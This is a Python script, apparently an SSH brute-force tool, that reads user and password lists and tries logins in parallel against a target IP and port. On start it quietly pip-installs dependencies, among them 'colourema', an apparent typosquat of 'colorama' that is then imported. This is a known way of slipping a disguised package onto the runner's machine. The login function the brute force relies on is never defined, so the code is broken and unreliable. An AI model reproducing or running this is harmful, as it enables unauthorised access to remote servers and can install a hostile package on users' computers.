import pkg_resources
import subprocess
import platform
import multiprocessing as mp


required_modules = ['paramiko', 'termcolor', 'pystyle', 'colourema']

if platform.system().startswith("Linux"):
    python_executable = "python3"
elif platform.system().startswith("Windows"):
    python_executable = "python"
else:
    print("Error: Unsupported platform")
    exit()

for module in required_modules:
    try:
        pkg_resources.require(module)
    except pkg_resources.DistributionNotFound:
        # install the missing module using pip
        subprocess.run([python_executable, "-m", "pip", "install", module, "-q", "-q", "-q"], check=True)

import os
import time
import paramiko
import termcolor
from pystyle import *
import colourema
from colourema import Fore, Back, Style

colourema.deinit()
banner = Center.XCenter("""

oooooo     oooo           o8o                    .o8                     .oooooo..o  .oooooo..o ooooo   ooooo 
 `888.     .8'            `"'                   "888                    d8P'    `Y8 d8P'    `Y8 `888'   `888' 
  `888.   .8'   oooo d8b oooo  ooo. .oo.    .oooo888   .oooo.           Y88bo.      Y88bo.       888     888  
   `888. .8'    `888""8P `888  `888P"Y88b  d88' `888  `P  )88b           `"Y8888o.   `"Y8888o.   888ooooo888  
    `888.8'      888      888   888   888  888   888   .oP"888  8888888      `"Y88b      `"Y88b  888     888  
     `888'       888      888   888   888  888   888  d8(  888          oo     .d8P oo     .d8P  888     888  
      `8'       d888b    o888o o888o o888o `Y8bod88P" `Y888""8o         8""88888P'  8""88888P'  o888o   o888o                                                                                                                                                        
                            \n 
""")


usr_arr = [];
pass_arr = []

try:
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Vertical(Colors.purple_to_red, banner, 2))
    user_list = input(termcolor.colored("\n[*] Enter Path Of Users List:- ", 'magenta'))
    pass_list = file = input(termcolor.colored("\n[*] Enter Path Of Password List:- ", 'cyan'))
    host = input(termcolor.colored("\n[*] Enter target ip:- ", 'red'))
    port = input(termcolor.colored("\n[*] Enter port:- ", 'grey'))
    print('\n')
    print(termcolor.colored("[+] BruteForce Started....",'magenta'))
    print('\n')
except KeyboardInterrupt:
    print(termcolor.colored("[X] You Pressed The Exit Button!",'red'))
    quit()


users_lis = open(user_list, "r")
for l in users_lis:
    u = l.strip();
    usr_arr.append(u)
users_lis.close()

passwords = open(pass_list, "r")
for l in passwords:
    p = l.strip();
    pass_arr.append(p)
passwords.close()
with mp.Pool(4) as p:
        # Start the brute-force login attempts in parallel using the map() method
        results = p.starmap(login, [(usr, passwd, host, port) for usr in usr_arr for passwd in pass_arr])
        # Check if any valid credentials were found
        if any(results):
            print(termcolor.colored("[*] Completed...\n",'green'))
        else:
            print(termcolor.colored("[*] No valid credentials found...\n",'red'))
quit()